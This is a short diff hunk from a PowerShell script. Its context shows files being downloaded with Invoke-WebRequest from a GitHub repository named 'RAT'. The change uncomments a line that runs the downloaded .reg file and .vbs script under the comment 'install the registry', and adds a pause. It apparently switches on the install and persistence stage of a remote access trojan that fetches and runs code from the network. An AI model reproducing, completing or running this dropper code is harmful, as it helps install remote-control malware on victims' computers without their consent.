@@ -48,7 +48,8 @@ Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/co
 
 
 ##install the registry
-#./"$reg_file.reg";"$vbs_file.vbs"
+./"$reg_file.reg";"$vbs_file.vbs"
+pause
 
 #cd $env:temp
 #$directory_name = random_text
